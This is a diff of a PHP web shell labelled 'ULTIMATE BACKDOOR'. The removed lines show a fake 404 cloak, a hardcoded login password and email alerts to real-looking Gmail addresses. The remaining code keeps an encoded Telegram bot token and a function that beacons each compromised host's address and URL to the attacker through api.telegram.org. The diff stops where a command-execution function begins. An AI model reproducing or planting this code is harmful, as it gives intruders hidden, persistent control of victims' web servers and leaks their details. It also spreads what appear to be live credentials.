@@ -1,184 +1,36 @@
 <?php
-session_start();
-$session_path = session_save_path();
-if (empty($session_path) || !is_writable($session_path)) {
-    $tmp_path = sys_get_temp_dir();
-    if (is_writable($tmp_path)) {
-        session_save_path($tmp_path);
-    }
-}
-
-session_start([
-    'cookie_httponly' => true,
-    'use_only_cookies' => true,
-    'cookie_lifetime' => 0,
-]);
-
-// ============================================================
-// FAKE 404 — HIDDEN MODE
-// ============================================================
-$secret_param = 'x';
-$secret_value = 'worm2024';
-if (!isset($_GET[$secret_param]) || $_GET[$secret_param] !== $secret_value) {
-    http_response_code(404);
-    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
-}
-
-// ============================================================
-// EMAIL NOTIFICATION (Gmail)
-// ============================================================
-$email_recipients = ['muhrazky@gmail.com', 'malaysia.sender@gmail.com', 'hackerman3117@gmail.com'];
-
-function sendEmailAlert($subject, $message) {
-    global $email_recipients;
-    $headers = "From: backdoor@system.local\r\n";
-    $headers .= "MIME-Version: 1.0\r\n";
-    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
-    foreach ($email_recipients as $email) {
-        @mail($email, $subject, $message, $headers);
-    }
-}
-
-// ============================================================
-// TELEGRAM CONFIG
-// ============================================================
-$tk = base64_decode("ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw");
+$tk = base64_decode(
+    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
+);
 $cid = base64_decode("NTA3MDkzODc3OA");
 
-function reportTelegram($msg) {
+function reportTelegram($msg)
+{
     global $tk, $cid;
-    $id = sys_get_temp_dir() . "/Mysql_" . md5($msg);
+    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
     if (!file_exists($id)) {
-        @file_get_contents("https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" . urlencode($msg));
+        @file_get_contents(
+            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
+                urlencode($msg)
+        );
         @file_put_contents($id, time());
     }
 }
-
-// ============================================================
-// AUTH — FIXED (No Loop) + SOUND
-// ============================================================
-$auth_password = "wormtbl";
-$login_error = '';
-$play_sound = false;
-
-// Session validation
-if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
-    if (isset($_SESSION['ip']) && $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
-        session_destroy();
-        header('Location: ' . $_SERVER['PHP_SELF']);
-        exit;
-    }
-    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > 1800) {
-        session_destroy();
-        header('Location: ' . $_SERVER['PHP_SELF']);
-        exit;
-    }
-    if (isset($_SESSION['user_agent']) && $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
-        session_destroy();
-        header('Location: ' . $_SERVER['PHP_SELF']);
-        exit;
-    }
-} else {
-    if (isset($_POST['pass'])) {
-        if ($_POST['pass'] === $auth_password) {
-            $_SESSION['logged_in'] = true;
-            $_SESSION['login_time'] = time();
-            $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
-            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
-            session_regenerate_id(true);
-            reportTelegram("✅ Login: " . $_SERVER['REMOTE_ADDR'] . " | " . $_SERVER['HTTP_HOST']);
-            sendEmailAlert("✅ Login Success", "IP: " . $_SERVER['REMOTE_ADDR'] . "\nHost: " . $_SERVER['HTTP_HOST']);
-            header('Location: ' . $_SERVER['PHP_SELF'] . '?x=worm2024');
-            exit;
-        } else {
-            $login_error = '❌ Wrong password!';
-            $play_sound = true;
-            reportTelegram("❌ Failed login: " . $_SERVER['REMOTE_ADDR']);
-            if (!isset($_SESSION['login_attempts'])) $_SESSION['login_attempts'] = 0;
-            $_SESSION['login_attempts']++;
-            if ($_SESSION['login_attempts'] >= 5) {
-                $login_error = '⛔ Too many attempts! Locked for 15 minutes.';
-                $_SESSION['login_lockout'] = time() + 900;
-                sendEmailAlert("🚨 Brute Force Detected", "IP: " . $_SERVER['REMOTE_ADDR']);
-            }
-        }
-    }
-    
-    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
-        if (isset($_SESSION['login_lockout']) && $_SESSION['login_lockout'] > time()) {
-            $login_error = '⛔ Locked. Try again later.';
-        }
-        echo '<!DOCTYPE html><html><head><title>Login</title>
-        <style>
-        @import url("https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap");
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{background:linear-gradient(135deg,#0a0a1a,#1a0a2e,#0d0d2b);min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:"Orbitron",monospace;overflow:hidden;}
-        body::before{content:"";position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 30% 50%,rgba(0,212,255,0.05),transparent 60%),radial-gradient(ellipse at 70% 50%,rgba(255,215,0,0.03),transparent 60%);animation:glow 8s ease-in-out infinite alternate;z-index:0;}
-        @keyframes glow{0%{transform:scale(1) rotate(0deg)}100%{transform:scale(1.1) rotate(3deg)}}
-        .login{position:relative;z-index:1;background:rgba(17,17,40,0.85);backdrop-filter:blur(20px);padding:50px 60px;border-radius:20px;border:1px solid rgba(255,215,0,0.2);text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,215,0,0.1);width:400px;max-width:95%;}
-        .login .icon{font-size:48px;margin-bottom:16px;display:block;}
-        .login h2{color:#ffd700;font-size:24px;font-weight:700;letter-spacing:3px;margin-bottom:8px;text-shadow:0 0 30px rgba(255,215,0,0.3);}
-        .login .sub{color:#6a6a8a;font-size:11px;letter-spacing:5px;margin-bottom:30px;text-transform:uppercase;}
-        .login input{width:100%;background:rgba(13,13,30,0.8);border:1px solid rgba(255,215,0,0.15);color:#e0e0f0;padding:14px 18px;border-radius:10px;font-family:inherit;font-size:14px;outline:none;transition:all 0.3s;}
-        .login input:focus{border-color:#ffd700;box-shadow:0 0 25px rgba(255,215,0,0.1);}
-        .login input.error{border-color:#ff0044;box-shadow:0 0 30px rgba(255,0,68,0.3);animation:shake 0.5s;}
-        @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}}
-        .login button{width:100%;background:linear-gradient(135deg,#ffd700,#cc9900);color:#0a0a1a;border:none;padding:14px;border-radius:10px;font-family:inherit;font-size:15px;font-weight:700;cursor:pointer;transition:all 0.3s;letter-spacing:2px;margin-top:12px;}
-        .login button:hover{transform:translateY(-2px);box-shadow:0 10px 40px rgba(255,215,0,0.3);}
-        .login .error-msg{color:#ff0044;font-size:12px;margin-top:8px;min-height:20px;}
-        .login .footer{color:#3a3a5a;font-size:10px;margin-top:20px;letter-spacing:1px;}
-        .login .footer span{color:#ffd700;}
-        </style>
-        </head><body>';
-        if ($play_sound) {
-            echo '<audio autoplay style="display:none;"><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
-        }
-        echo '<div class="login">
-            <span class="icon">🐉</span>
-            <h2>ULTIMATE BACKDOOR</h2>
-            <div class="sub">v14.0 · Secure Access</div>
-            <form method="POST" action="">
-                <input type="password" name="pass" id="passInput" placeholder="Enter password..." autofocus>
-                <div class="error-msg">' . $login_error . '</div>
-                <button type="submit">UNLOCK</button>
-            </form>
-            <div class="footer">⚡ <span>worm123</span> · Authorized Only</div>
-        </div>
-        <script>
-        document.querySelector("form").addEventListener("submit", function(e) {
-            var pass = document.getElementById("passInput").value;
-            if (pass !== "worm123") {
-                e.preventDefault();
-                document.getElementById("passInput").className = "error";
-                setTimeout(function() {
-                    document.getElementById("passInput").className = "";
-                }, 1000);
-            }
-        });
-        </script>
-        </body></html>';
-        exit;
-    }
-}
-
-// ============================================================
-// TELEGRAM REPORT (on access)
-// ============================================================
+/* ================= Report ================= */
 if (!isset($_SESSION["telegram_reported"])) {
     $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
     $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
     if (is_file($path)) {
         $host = $_SERVER["HTTP_HOST"];
-        $url = (isset($_SERVER["HTTPS"]) ? "https" : "http") . "://" . $host . $uri;
-        reportTelegram("📁 Access:\n$host\n$url");
-        sendEmailAlert("📁 Backdoor Accessed", "Host: $host\nURL: $url\nIP: " . $_SERVER['REMOTE_ADDR']);
+        $url =
+            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
+            "://" .
+            $host .
+            $uri;
+        reportTelegram("kontolbengkak:\n$host\n$url");
         $_SESSION["telegram_reported"] = true;
     }
 }
-
-// ============================================================
-// FUNCTIONS
-// ============================================================
 function e($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
 
 function cmd_exec($cmd) {
